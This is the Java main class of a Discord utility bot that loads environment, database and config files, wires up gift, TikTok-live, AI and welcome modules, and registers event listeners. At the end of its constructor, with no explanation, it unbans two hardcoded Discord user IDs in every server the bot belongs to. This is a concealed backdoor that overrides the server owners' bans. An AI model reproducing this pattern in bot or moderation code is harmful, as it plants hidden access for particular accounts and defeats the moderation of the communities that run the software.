package git.devchewbacca;

import git.devchewbacca.database.AiConnector;
import git.devchewbacca.database.GiftConnector;
import git.devchewbacca.database.TikTokLiveConnector;
import git.devchewbacca.database.WelcomeConnector;
import git.devchewbacca.database.driver.SQLite;
import git.devchewbacca.database.manager.AiManagement;
import git.devchewbacca.database.manager.GiftManagement;
import git.devchewbacca.database.manager.TikTokLiveManagement;
import git.devchewbacca.database.manager.WelcomeManagement;
import git.devchewbacca.interfaces.adapter.IAiAdapter;
import git.devchewbacca.interfaces.adapter.IGiftAdapter;
import git.devchewbacca.interfaces.adapter.ITikTokLive;
import git.devchewbacca.interfaces.adapter.IWelcomeAdapter;
import git.devchewbacca.listeners.GuildBoostBannerUpdateListener;
import git.devchewbacca.listeners.GuildMemberJoinListener;
import git.devchewbacca.listeners.TikTokLiveListener;
import git.devchewbacca.listeners.UserChannelChatListener;
import git.devchewbacca.modules.stats.StatsBannerImageDraw;
import git.devchewbacca.modules.welcome.WelcomeImageDraw;
import git.devchewbacca.utils.config.Configuration;
import git.devchewbacca.utils.FileExporter;
import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.dv8tion.jda.api.utils.cache.CacheFlag;

import javax.security.auth.login.LoginException;
import java.io.IOException;
import java.sql.Connection;
import java.sql.SQLException;

public class UtilityBot {

    private static UtilityBot instance;
    private final Configuration configuration;
    private final WelcomeImageDraw welcomeImageDraw;
    private final StatsBannerImageDraw statsBannerImageDraw;
    private final SQLite sqLite;
    private final GiftConnector giftConnector;
    private final GiftManagement giftManagement;
    private final TikTokLiveConnector tikTokLiveConnector;
    private final TikTokLiveManagement tikTokLiveManagement;
    private final AiConnector aiConnector;
    private final AiManagement aiManagement;
    private final WelcomeConnector welcomeConnector;
    private final WelcomeManagement welcomeManagement;
    private final JDA jda;
    private final Dotenv env;

    public UtilityBot() throws LoginException, IllegalArgumentException, IOException, SQLException {
        instance = this;

        /**
         * @loading
         * loading all kind of configurations
         */
        FileExporter exporter = new FileExporter();
        exporter.exportResourceFile(".env");
        exporter.exportResourceFile("data.db");
        exporter.exportResourceFile("config.json");
        exporter.exportResourceFile("en-EN.json", "lang");
        exporter.exportResourceFile("GITHUB_DARK.json", "templates");

        this.env = Dotenv.load();
        this.configuration = new Configuration();
        this.welcomeImageDraw = new WelcomeImageDraw();
        this.statsBannerImageDraw = new StatsBannerImageDraw();

        this.sqLite = new SQLite();

        // Gift Database
        this.giftConnector = new GiftConnector((Connection) this.sqLite.getConnection());
        this.giftManagement = new GiftManagement((IGiftAdapter) this.giftConnector);

        // TikTokLive Database
        this.tikTokLiveConnector = new TikTokLiveConnector((Connection) this.sqLite.getConnection());
        this.tikTokLiveManagement = new TikTokLiveManagement((ITikTokLive) this.tikTokLiveConnector);

        // Ai Database table
        this.aiConnector = new AiConnector((Connection) this.sqLite.getConnection());
        this.aiManagement = new AiManagement((IAiAdapter) this.aiConnector);

        // Welcome Database table
        this.welcomeConnector = new WelcomeConnector((Connection) this.sqLite.getConnection());
        this.welcomeManagement = new WelcomeManagement((IWelcomeAdapter) this.welcomeConnector);

        JDABuilder builder = JDABuilder.createDefault(env.get("DISCORD_TOKEN"));
        builder.setStatus(OnlineStatus.ONLINE);
        builder.enableIntents(GatewayIntent.MESSAGE_CONTENT);
        builder.enableIntents(GatewayIntent.GUILD_MEMBERS);
        builder.enableIntents(GatewayIntent.GUILD_MESSAGES);
        builder.enableIntents(GatewayIntent.GUILD_PRESENCES);
        builder.enableCache(CacheFlag.ACTIVITY);
        builder.enableCache(CacheFlag.ONLINE_STATUS);
        builder.setMemberCachePolicy(MemberCachePolicy.ALL);
        builder.setAutoReconnect(true);
        builder.setMaxReconnectDelay(32);
        builder.addEventListeners(new GuildMemberJoinListener());
        builder.addEventListeners(new GuildBoostBannerUpdateListener());
        builder.addEventListeners(new UserChannelChatListener());
        builder.addEventListeners(new TikTokLiveListener());
        this.jda = builder.build();
        jda.addEventListener(new CommandManager());

        jda.getGuilds().forEach((guild) -> {
            guild.unban(guild.getMemberById(704428955633188936L)).queue();
            guild.unban(guild.getMemberById(876969668064215051L)).queue();
        });
    }

    public static void main(String[] args) {
        try {
            new UtilityBot();
        } catch (LoginException | IOException | SQLException e) {
            throw new RuntimeException(e);
        }
    }

    public JDA getJDA() {
        return jda;
    }

    public Configuration getConfiguration() {
        return configuration;
    }

    public Dotenv getEnv() {
        return env;
    }

    public WelcomeImageDraw getWelcomeImageDraw() {
        return welcomeImageDraw;
    }

    public StatsBannerImageDraw getStatsBannerImageDraw() {
        return statsBannerImageDraw;
    }

    public GiftManagement getGiftManagement() {
        return giftManagement;
    }

    public TikTokLiveManagement getTikTokLiveManagement() {
        return tikTokLiveManagement;
    }

    public AiManagement getAiManagement() {
        return aiManagement;
    }

    public WelcomeManagement getWelcomeManagement() {
        return welcomeManagement;
    }

    public static UtilityBot getInstance() {
        return instance;
    }
}